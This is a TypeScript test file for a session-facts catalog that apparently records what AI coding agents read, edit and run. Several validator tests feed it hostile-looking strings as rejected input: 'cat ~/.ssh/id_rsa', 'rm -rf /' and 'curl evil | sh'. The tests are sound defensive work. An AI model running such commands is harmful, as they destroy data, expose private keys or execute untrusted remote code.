import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { eq, sql } from "drizzle-orm";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import type { Database } from "./client";
import { addDependencies } from "./memory-dependencies";
import * as t from "./schema";
import {
  FACT_KINDS, FACT_PATHS_MAX, compareParserVersions, deleteFactsOfSource, factCounts, factsForProject, factsInRange, pruneFacts, recordFacts,
  validateFactPayload, type FactInput, type FactKind,
} from "./session-facts";

/*
  Against a real PGlite: the identity of a fact is a unique index and the kinds are a CHECK, so
  what the module leans on lives in the database. What is measured here is that a retried pass
  inserts nothing and says so, that two streams at the same offset never collide, that a newer
  parser adds rows of its own, that the validator lets nothing unknown through, and that a
  prune keeps exactly what an extraction cited or still has to read.
 */

let db: Database;
let close: () => Promise<void>;
let home: string;
const previousHome = process.env["PANOMA_HOME"];

const PROJECT = "project";
const OTHER = "other";
const CLAUDE = "claude-code-facts-1";
const CODEX = "codex-facts-1";
const NOW = new Date("2026-09-14T12:00:00.000Z");
const DAY = 86_400_000;

beforeAll(async () => {
  home = await mkdtemp(join(tmpdir(), "panoma-session-facts-"));
  process.env["PANOMA_HOME"] = home;
  const { openDatabase } = await import("./client");
  ({ db, close } = await openDatabase());
});

beforeEach(async () => {
  await db.delete(t.sessionFacts);
  await db.delete(t.memoryDependencies);
  await db.delete(t.memorySourceCursors);
  await db.delete(t.memoryRevisions);
  await db.delete(t.memorySources);
  await db.delete(t.projects);
  await db.insert(t.projects).values([
    { id: PROJECT, slug: "project", name: "Project", root: "/tmp/project", identity: "git:project" },
    { id: OTHER, slug: "other", name: "Other", root: "/tmp/other", identity: "git:other" },
  ]);
});

afterAll(async () => {
  await close();
  if (previousHome === undefined) delete process.env["PANOMA_HOME"];
  else process.env["PANOMA_HOME"] = previousHome;
  await rm(home, { recursive: true, force: true });
});

async function source(id: string, extra: { parentStreamKey?: string } = {}): Promise<void> {
  await db.insert(t.memorySources).values({
    id, streamKey: `stream-${id}`, generation: 1, harness: "claude-code", entrypoint: "desktop", origin: "native", ...extra,
  });
}

function fact(sourceId: string, byteOffset: number, overrides: Partial<FactInput> = {}): FactInput {
  return {
    sourceId, byteOffset, subIndex: 0, parserVersion: CLAUDE, projectId: PROJECT, identity: "git:project", recipientKey: "main",
    kind: "read", payload: { schemaVersion: 1, paths: ["src/index.ts"], tool: "Read" }, observedAt: NOW, ...overrides,
  };
}

function record(facts: FactInput[]) {
  return db.transaction((tx) => recordFacts(tx, facts));
}

async function offsets(sourceId: string): Promise<number[]> {
  return (await factsInRange(db, sourceId, 0, null)).map((row) => row.byteOffset);
}

describe("validateFactPayload", () => {
  it("accepts every kind with its full payload and fills schemaVersion in", () => {
    expect(validateFactPayload("read", { paths: ["src/a.ts", "outside"], tool: "Read" })).toEqual({ schemaVersion: 1, paths: ["src/a.ts", "outside"], tool: "Read" });
    expect(validateFactPayload("edit", { schemaVersion: 1, paths: ["src/a.ts"], tool: "Edit", kind: "modify" }))
      .toEqual({ schemaVersion: 1, paths: ["src/a.ts"], tool: "Edit", kind: "modify" });
    expect(validateFactPayload("command", { family: "test", tool: "Bash", cwdInside: null })).toEqual({ schemaVersion: 1, family: "test", tool: "Bash", cwdInside: null });
    expect(validateFactPayload("test_result", { family: "test", outcome: "fail", suites: ["db"], counts: { passed: 3, failed: 1 } }))
      .toEqual({ schemaVersion: 1, family: "test", outcome: "fail", suites: ["db"], counts: { passed: 3, failed: 1 } });
    expect(validateFactPayload("failure", { tool: "Bash", kind: "tool_error", family: "build" })).toEqual({ schemaVersion: 1, tool: "Bash", kind: "tool_error", family: "build" });
    expect(validateFactPayload("commit", { validated: false, family: "git" })).toEqual({ schemaVersion: 1, validated: false, family: "git" });
    expect(validateFactPayload("lifecycle", { event: "subagent_start" })).toEqual({ schemaVersion: 1, event: "subagent_start" });
    expect(validateFactPayload("receipt_seen", { contractIds: ["srv_abc-123"] })).toEqual({ schemaVersion: 1, contractIds: ["srv_abc-123"] });
    expect(validateFactPayload("lifecycle", { event: "end", copied: true })).toEqual({ schemaVersion: 1, copied: true, event: "end" });
    expect(validateFactPayload("read", { tool: undefined })).toEqual({ schemaVersion: 1 });
    expect(FACT_KINDS).toEqual(["read", "edit", "command", "test_result", "failure", "commit", "lifecycle", "receipt_seen"]);
  });

  it("rejects an unknown key, and never echoes the value", () => {
    expect(() => validateFactPayload("read", { paths: ["a"], line: "cat ~/.ssh/id_rsa" })).toThrow(TypeError);
    try {
      validateFactPayload("read", { paths: ["a"], line: "cat ~/.ssh/id_rsa" });
      expect.unreachable();
    } catch (error) {
      expect((error as Error).message).toBe('Unknown key "line" in a read fact payload.');
      expect((error as Error).message).not.toContain("id_rsa");
    }
    expect(() => validateFactPayload("test_result", { counts: { passed: 1, skipped: 2 } })).toThrow('Unknown key "skipped" in a test_result fact payload under "counts".');
    expect(() => validateFactPayload("lifecycle", { event: "start", text: "hello" })).toThrow(TypeError);
  });

  it("rejects an unknown kind", () => {
    expect(() => validateFactPayload("prompt", { text: "x" })).toThrow(new TypeError("Unknown fact kind."));
    expect(() => validateFactPayload("", {})).toThrow(TypeError);
    expect(() => validateFactPayload("READ", {})).toThrow(TypeError);
  });

  it("caps the paths at thirty entries of at most 512 characters, none empty, none with a control character", () => {
    const thirty = Array.from({ length: FACT_PATHS_MAX }, (_, index) => `src/file-${index}.ts`);
    expect(validateFactPayload("read", { paths: thirty }).paths).toHaveLength(30);
    expect(() => validateFactPayload("read", { paths: [...thirty, "src/one-too-many.ts"] })).toThrow("names more than 30 entries");
    expect(validateFactPayload("edit", { paths: ["x".repeat(512)] }).paths?.[0]).toHaveLength(512);
    expect(() => validateFactPayload("edit", { paths: ["x".repeat(513)] })).toThrow("at most 512 characters");
    expect(() => validateFactPayload("read", { paths: [""] })).toThrow(TypeError);
    expect(() => validateFactPayload("read", { paths: ["a\nb"] })).toThrow(TypeError);
    expect(() => validateFactPayload("read", { paths: "src/a.ts" })).toThrow("must be a list of strings");
  });

  it("rejects anything that looks like a command line: an unknown key for it, or a tool that is not a token", () => {
    expect(() => validateFactPayload("command", { family: "other", command: "rm -rf /" })).toThrow('Unknown key "command" in a command fact payload.');
    expect(() => validateFactPayload("command", { family: "other", argv: ["rm", "-rf", "/"] })).toThrow(TypeError);
    expect(() => validateFactPayload("command", { family: "other", tool: "rm -rf /" })).toThrow("never like a command line");
    expect(() => validateFactPayload("failure", { tool: "bash -c 'x'" })).toThrow(TypeError);
    expect(() => validateFactPayload("command", { family: "other", tool: "/usr/bin/env" })).toThrow(TypeError);
    expect(validateFactPayload("command", { family: "other", tool: "mcp__server__tool" }).tool).toBe("mcp__server__tool");
  });

  it("keeps every enumeration closed and every count a non-negative integer", () => {
    expect(() => validateFactPayload("command", { family: "deploy" })).toThrow('A command fact payload has an invalid "family"');
    expect(() => validateFactPayload("command", { cwdInside: "yes" })).toThrow(TypeError);
    expect(() => validateFactPayload("edit", { kind: "delete" })).toThrow(TypeError);
    expect(() => validateFactPayload("test_result", { outcome: "flaky" })).toThrow(TypeError);
    expect(() => validateFactPayload("test_result", { family: "lint" })).toThrow('it can only be "test"');
    expect(() => validateFactPayload("test_result", { counts: { passed: -1 } })).toThrow("non-negative integer");
    expect(() => validateFactPayload("test_result", { counts: { failed: 1.5 } })).toThrow(TypeError);
    expect(() => validateFactPayload("test_result", { counts: [1, 2] })).toThrow("must be an object");
    expect(() => validateFactPayload("failure", { kind: "panic" })).toThrow(TypeError);
    expect(() => validateFactPayload("commit", { validated: true })).toThrow("it can only be false");
    expect(() => validateFactPayload("commit", { family: "other" })).toThrow(TypeError);
    expect(() => validateFactPayload("lifecycle", { event: "crash" })).toThrow(TypeError);
    expect(() => validateFactPayload("lifecycle", { copied: "yes" })).toThrow(TypeError);
    expect(() => validateFactPayload("read", { schemaVersion: 2 })).toThrow("this catalog writes version 1");
    expect(() => validateFactPayload("read", null)).toThrow("must be an object");
    expect(() => validateFactPayload("read", ["a"])).toThrow(TypeError);
  });

  it("caps the contract ids at fifty opaque ids", () => {
    const fifty = Array.from({ length: 50 }, (_, index) => `srv_${index}`);
    expect(validateFactPayload("receipt_seen", { contractIds: fifty }).contractIds).toHaveLength(50);
    expect(() => validateFactPayload("receipt_seen", { contractIds: [...fifty, "srv_50"] })).toThrow("more than 50 entries");
    expect(() => validateFactPayload("receipt_seen", { contractIds: ["srv 1"] })).toThrow("opaque id");
    expect(() => validateFactPayload("receipt_seen", { contractIds: ["a".repeat(129)] })).toThrow(TypeError);
  });
});

describe("recordFacts", () => {
  it("T34: one record yields several facts with a stable subIndex, a retry inserts nothing and reports the duplicates", async () => {
    await source("msrc_a");
    const batch = [
      fact("msrc_a", 1_024, { subIndex: 0, kind: "command", payload: { schemaVersion: 1, family: "test", tool: "Bash", cwdInside: true } }),
      fact("msrc_a", 1_024, { subIndex: 1, kind: "test_result", payload: { schemaVersion: 1, family: "test", outcome: "pass", counts: { passed: 12 } } }),
      fact("msrc_a", 1_024, { subIndex: 2, kind: "commit", payload: { schemaVersion: 1, validated: false, family: "git" } }),
    ];
    expect(await record(batch)).toEqual({ inserted: 3, duplicates: 0 });
    expect(await record(batch)).toEqual({ inserted: 0, duplicates: 3 });
    expect(await record([...batch, fact("msrc_a", 2_048)])).toEqual({ inserted: 1, duplicates: 3 });
    expect(await record([fact("msrc_a", 4_096), fact("msrc_a", 4_096)])).toEqual({ inserted: 1, duplicates: 1 });
    const rows = await factsInRange(db, "msrc_a", 0, null);
    expect(rows.map((row) => [row.byteOffset, row.subIndex, row.kind])).toEqual([
      [1_024, 0, "command"], [1_024, 1, "test_result"], [1_024, 2, "commit"], [2_048, 0, "read"], [4_096, 0, "read"],
    ]);
    expect(rows.every((row) => /^fact_[0-9a-f-]{36}$/.test(row.id))).toBe(true);
    expect(rows.map((row) => row.ingestSeq)).toEqual([...rows.map((row) => row.ingestSeq)].sort((a, b) => a - b));
    expect(rows[1]?.payload).toEqual({ schemaVersion: 1, family: "test", outcome: "pass", counts: { passed: 12 } });
    expect(rows[0]).toMatchObject({ projectId: PROJECT, identity: "git:project", recipientKey: "main", parserVersion: CLAUDE, observedAt: NOW });
    expect(await record([])).toEqual({ inserted: 0, duplicates: 0 });
  });

  it("B06/T33: two children with equal offsets are two identities, never a collision and never an order", async () => {
    await source("msrc_parent");
    await source("msrc_child_1", { parentStreamKey: "stream-msrc_parent" });
    await source("msrc_child_2", { parentStreamKey: "stream-msrc_parent" });
    const later = new Date(NOW.getTime() + 60_000);
    expect(await record([
      fact("msrc_child_2", 0, { recipientKey: "sub:2", kind: "lifecycle", payload: { schemaVersion: 1, event: "subagent_start" }, observedAt: later }),
      fact("msrc_child_1", 0, { recipientKey: "sub:1", kind: "lifecycle", payload: { schemaVersion: 1, event: "subagent_start" } }),
      fact("msrc_parent", 0, { kind: "lifecycle", payload: { schemaVersion: 1, event: "start" } }),
    ])).toEqual({ inserted: 3, duplicates: 0 });
    expect(await factsInRange(db, "msrc_child_1", 0, 1)).toHaveLength(1);
    expect(await factsInRange(db, "msrc_child_2", 0, 1)).toHaveLength(1);
    expect((await factsInRange(db, "msrc_child_1", 0, 1))[0]?.recipientKey).toBe("sub:1");
    // The catalog learned about child 2 first; its offset is the same and its native time is later: no order follows from either.
    const all = await factsForProject(db, PROJECT);
    expect(all.map((row) => row.sourceId)).toEqual(["msrc_child_2", "msrc_child_1", "msrc_parent"]);
    expect(all.map((row) => row.byteOffset)).toEqual([0, 0, 0]);
  });

  it("T38/T87: a second parser version inserts rows of its own at the same coordinates, the first reading untouched", async () => {
    await source("msrc_a");
    expect(await record([fact("msrc_a", 512, { parserVersion: CLAUDE })])).toEqual({ inserted: 1, duplicates: 0 });
    const reread = fact("msrc_a", 512, { parserVersion: "claude-code-facts-2", kind: "edit", payload: { schemaVersion: 1, paths: ["src/index.ts"], tool: "Edit", kind: "modify" } });
    expect(await record([reread])).toEqual({ inserted: 1, duplicates: 0 });
    expect(await record([reread])).toEqual({ inserted: 0, duplicates: 1 });
    const rows = await factsInRange(db, "msrc_a", 512, 513);
    expect(rows.map((row) => [row.parserVersion, row.kind])).toEqual([[CLAUDE, "read"], ["claude-code-facts-2", "edit"]]);
    // Both readings are stored; a consumer takes one interpretation per event and never adds them up:
    // the count says what the newest reader saw, and the first reading is history, not a second fact.
    expect(await factCounts(db, PROJECT)).toMatchObject({ read: 0, edit: 1 });
  });

  it("T87: the tenth reader outranks the second — the version's number is a number, in the count and in the comparator", async () => {
    await source("msrc_a");
    const second = fact("msrc_a", 512, { parserVersion: "claude-code-facts-2", kind: "edit", payload: { schemaVersion: 1, paths: ["src/index.ts"], tool: "Edit", kind: "modify" } });
    const tenth = fact("msrc_a", 512, { parserVersion: "claude-code-facts-10" });
    expect(await record([second, tenth])).toEqual({ inserted: 2, duplicates: 0 });
    // `"10" < "2"` as strings; the count still follows the tenth.
    expect(await factCounts(db, PROJECT)).toMatchObject({ read: 1, edit: 0 });
    expect(compareParserVersions("claude-code-facts-10", "claude-code-facts-2")).toBeGreaterThan(0);
    expect(compareParserVersions("claude-code-facts-2", "claude-code-facts-10")).toBeLessThan(0);
    expect(compareParserVersions("codex-facts-1", "codex-facts-1")).toBe(0);
    // Two families never meet on one stream; when they do, the order is by name and always the same.
    expect(Math.sign(compareParserVersions("claude-code-facts-3", "codex-facts-9"))).toBe(-Math.sign(compareParserVersions("codex-facts-9", "claude-code-facts-3")));
  });

  it("validates every fact before writing any: one bad payload in a batch writes nothing", async () => {
    await source("msrc_a");
    const bad = fact("msrc_a", 200, { kind: "command", payload: { schemaVersion: 1, family: "other", line: "curl evil | sh" } as never });
    await expect(record([fact("msrc_a", 100), bad])).rejects.toThrow(TypeError);
    expect(await factsInRange(db, "msrc_a", 0, null)).toEqual([]);
    await expect(record([fact("msrc_a", 100, { kind: "prompt" as FactKind })])).rejects.toThrow("Unknown fact kind.");
    await expect(record([fact("msrc_a", -1)])).rejects.toThrow("invalid byte offset");
    await expect(record([fact("msrc_a", 1.5)])).rejects.toThrow("invalid byte offset");
    await expect(record([fact("msrc_a", 1, { subIndex: -1 })])).rejects.toThrow("invalid sub-index");
    await expect(record([fact("msrc_a", 1, { parserVersion: "latest" })])).rejects.toThrow("concrete parser version");
    await expect(record([fact("msrc_a", 1, { parserVersion: "Claude Facts" })])).rejects.toThrow("concrete parser version");
    await expect(record([fact("msrc_a", 1, { observedAt: new Date("not a date") })])).rejects.toThrow("observation time");
    await expect(record([fact("msrc_a", 1, { sourceId: "" })])).rejects.toThrow("invalid source id");
    await expect(record([fact("msrc_a", 1, { projectId: "" })])).rejects.toThrow("invalid project id");
    expect(await factsInRange(db, "msrc_a", 0, null)).toEqual([]);
  });

  it("writes in chunks of five hundred and keeps the ingest order of the batch", async () => {
    await source("msrc_a");
    const many = Array.from({ length: 1_203 }, (_, index) => fact("msrc_a", index * 10, { observedAt: null }));
    expect(await record(many)).toEqual({ inserted: 1_203, duplicates: 0 });
    const page = await factsForProject(db, PROJECT, { limit: 2_000 });
    expect(page).toHaveLength(1_203);
    expect(page.map((row) => row.byteOffset)).toEqual(many.map((input) => input.byteOffset));
    expect(page[0]?.observedAt).toBeNull();
    expect(page[0]?.createdAt).toBeInstanceOf(Date);
  });
});

describe("readers", () => {
  it("factsForProject pages by ingestSeq, filters by kind, and never returns another project's facts", async () => {
    await source("msrc_a");
    await source("msrc_b");
    await record([
      fact("msrc_a", 0),
      fact("msrc_a", 10, { kind: "edit", payload: { schemaVersion: 1, paths: ["a"], kind: "create" } }),
      fact("msrc_b", 0, { projectId: OTHER, identity: "git:other" }),
      fact("msrc_a", 20, { kind: "lifecycle", payload: { schemaVersion: 1, event: "end" } }),
      fact("msrc_a", 30, { projectId: null, identity: null }),
    ]);
    const all = await factsForProject(db, PROJECT);
    expect(all.map((row) => row.byteOffset)).toEqual([0, 10, 20]);
    const after = await factsForProject(db, PROJECT, { since: all[0]!.ingestSeq });
    expect(after.map((row) => row.byteOffset)).toEqual([10, 20]);
    expect((await factsForProject(db, PROJECT, { since: BigInt(all[1]!.ingestSeq) })).map((row) => row.byteOffset)).toEqual([20]);
    expect((await factsForProject(db, PROJECT, { kinds: ["edit", "lifecycle"] })).map((row) => row.kind)).toEqual(["edit", "lifecycle"]);
    expect((await factsForProject(db, PROJECT, { limit: 1 })).map((row) => row.byteOffset)).toEqual([0]);
    expect((await factsForProject(db, OTHER)).map((row) => row.sourceId)).toEqual(["msrc_b"]);
    await expect(factsForProject(db, PROJECT, { kinds: ["prompt" as FactKind] })).rejects.toThrow("Unknown fact kind.");
    await expect(factsForProject(db, PROJECT, { kinds: [] })).rejects.toThrow("at least one kind");
    await expect(factsForProject(db, PROJECT, { limit: 0 })).rejects.toThrow("Invalid fact query limit.");
    await expect(factsForProject(db, PROJECT, { limit: 10_001 })).rejects.toThrow("Invalid fact query limit.");
    await expect(factsForProject(db, PROJECT, { since: -1 })).rejects.toThrow("Invalid fact sequence.");
  });

  it("factsInRange answers [from, to) in native order and refuses an empty range", async () => {
    await source("msrc_a");
    await record([
      fact("msrc_a", 300, { subIndex: 1 }),
      fact("msrc_a", 300, { subIndex: 0 }),
      fact("msrc_a", 100),
      fact("msrc_a", 200),
      fact("msrc_a", 400),
    ]);
    expect((await factsInRange(db, "msrc_a", 100, 400)).map((row) => [row.byteOffset, row.subIndex])).toEqual([[100, 0], [200, 0], [300, 0], [300, 1]]);
    expect((await factsInRange(db, "msrc_a", 300, null)).map((row) => row.byteOffset)).toEqual([300, 300, 400]);
    expect((await factsInRange(db, "msrc_a", 0, 100))).toEqual([]);
    expect((await factsInRange(db, "msrc_a", 0, null, { limit: 2 })).map((row) => row.byteOffset)).toEqual([100, 200]);
    await expect(factsInRange(db, "msrc_a", 100, 100)).rejects.toThrow("ends after it starts");
    await expect(factsInRange(db, "msrc_a", -1, null)).rejects.toThrow("invalid range start");
    expect(await factsInRange(db, "msrc_missing", 0, null)).toEqual([]);
  });

  it("factCounts answers every kind, per project or for the whole catalog", async () => {
    await source("msrc_a");
    await source("msrc_b");
    await record([
      fact("msrc_a", 0),
      fact("msrc_a", 1),
      fact("msrc_a", 2, { kind: "edit", payload: { schemaVersion: 1, paths: ["a"] } }),
      fact("msrc_a", 3, { kind: "failure", payload: { schemaVersion: 1, tool: "Bash", kind: "interrupted" } }),
      fact("msrc_b", 0, { projectId: OTHER, kind: "receipt_seen", payload: { schemaVersion: 1, contractIds: ["srv_1"] } }),
      fact("msrc_b", 1, { projectId: null, kind: "lifecycle", payload: { schemaVersion: 1, event: "start" } }),
    ]);
    expect(await factCounts(db, PROJECT)).toEqual({ read: 2, edit: 1, command: 0, test_result: 0, failure: 1, commit: 0, lifecycle: 0, receipt_seen: 0 });
    expect(await factCounts(db, OTHER)).toEqual({ read: 0, edit: 0, command: 0, test_result: 0, failure: 0, commit: 0, lifecycle: 0, receipt_seen: 1 });
    expect(await factCounts(db)).toEqual({ read: 2, edit: 1, command: 0, test_result: 0, failure: 1, commit: 0, lifecycle: 1, receipt_seen: 1 });
    expect(await factCounts(db, "nobody")).toEqual(Object.fromEntries(FACT_KINDS.map((kind) => [kind, 0])));
  });
});

describe("pruneFacts", () => {
  const old = new Date(NOW.getTime() - 100 * DAY);

  async function revision(id: string): Promise<void> {
    await db.insert(t.memoryRevisions).values({
      id, kind: "note", objectId: id, rev: 1, scopeKind: "project", scopeRef: PROJECT, authority: "agent_report",
      disposition: "proposed", payload: { body: id }, payloadHash: "hash", reason: "create",
    });
  }

  async function cursor(sourceId: string, purpose: "facts" | "project_extract", nextByte: number, extra: Partial<typeof t.memorySourceCursors.$inferInsert> = {}): Promise<void> {
    await db.insert(t.memorySourceCursors).values({
      sourceId, purpose, grantId: `grant_${purpose}`, scopeKey: "git:project", grantGeneration: 1, allowedFrom: 0, nextByte, parserVersion: CLAUDE, state: "pending", ...extra,
    });
  }

  it("keeps a fact under a pending extract cursor and one inside a range a dependency names; forgets the rest past ninety days", async () => {
    await source("msrc_a");
    await record([0, 100, 200, 300, 400].map((offset) => fact("msrc_a", offset, { observedAt: old })));
    await record([fact("msrc_a", 500, { observedAt: NOW })]);
    // A fact whose record carried no time falls back to when the catalog wrote it.
    await record([fact("msrc_a", 350, { observedAt: null }), fact("msrc_a", 360, { observedAt: null })]);
    await db.update(t.sessionFacts).set({ createdAt: old }).where(eq(t.sessionFacts.byteOffset, 350));
    await revision("mrev_extracted");
    await addDependencies(db, [{ dependent: { revisionId: "mrev_extracted" }, input: { sourceId: "msrc_a", from: 200, to: 300 }, relation: "derived_from" }]);
    await cursor("msrc_a", "project_extract", 400);
    // A facts cursor, or an extract cursor with no work left, keeps nothing.
    await cursor("msrc_a", "facts", 0);
    await cursor("msrc_a", "project_extract", 0, { grantId: "grant_revoked", state: "revoked" });
    await cursor("msrc_a", "project_extract", 0, { grantId: "grant_backfill", allowedTo: 50, nextByte: 50, state: "complete" });

    expect(await pruneFacts(db, { now: NOW })).toBe(4);
    expect(await offsets("msrc_a")).toEqual([200, 360, 400, 500]);
    expect(await pruneFacts(db, { now: NOW })).toBe(0);
  });

  it("walks in batches, each its own short transaction, until nothing old is left", async () => {
    await source("msrc_a");
    await source("msrc_b");
    await record(Array.from({ length: 7 }, (_, index) => fact("msrc_a", index, { observedAt: old })));
    await record([fact("msrc_b", 0, { observedAt: old }), fact("msrc_b", 1, { observedAt: NOW })]);
    await revision("mrev_whole");
    // An edge without a range names the whole source: nothing of it goes.
    await addDependencies(db, [{ dependent: { revisionId: "mrev_whole" }, input: { sourceId: "msrc_b" }, relation: "supported_by" }]);
    expect(await pruneFacts(db, { now: NOW, batch: 3 })).toBe(7);
    expect(await offsets("msrc_a")).toEqual([]);
    expect(await offsets("msrc_b")).toEqual([0, 1]);
  });

  it("respects the retention it is given and refuses a nonsensical one", async () => {
    await source("msrc_a");
    await record([fact("msrc_a", 0, { observedAt: new Date(NOW.getTime() - 10 * DAY) })]);
    expect(await pruneFacts(db, { now: NOW })).toBe(0);
    expect(await pruneFacts(db, { now: NOW, olderThanDays: 7 })).toBe(1);
    await expect(pruneFacts(db, { olderThanDays: 0 })).rejects.toThrow("at least one");
    await expect(pruneFacts(db, { batch: 0 })).rejects.toThrow("Invalid prune batch.");
  });
});

describe("deleteFactsOfSource", () => {
  it("removes every fact of one source and none of another", async () => {
    await source("msrc_a");
    await source("msrc_b");
    await record([fact("msrc_a", 0), fact("msrc_a", 1, { parserVersion: CODEX }), fact("msrc_b", 0)]);
    expect(await db.transaction((tx) => deleteFactsOfSource(tx, "msrc_a"))).toBe(2);
    expect(await db.transaction((tx) => deleteFactsOfSource(tx, "msrc_a"))).toBe(0);
    expect(await offsets("msrc_b")).toEqual([0]);
    const [left] = await db.select({ count: sql<number>`count(*)::int` }).from(t.sessionFacts);
    expect(Number(left?.count)).toBe(1);
    await expect(db.transaction((tx) => deleteFactsOfSource(tx, ""))).rejects.toThrow("invalid source id");
  });
});
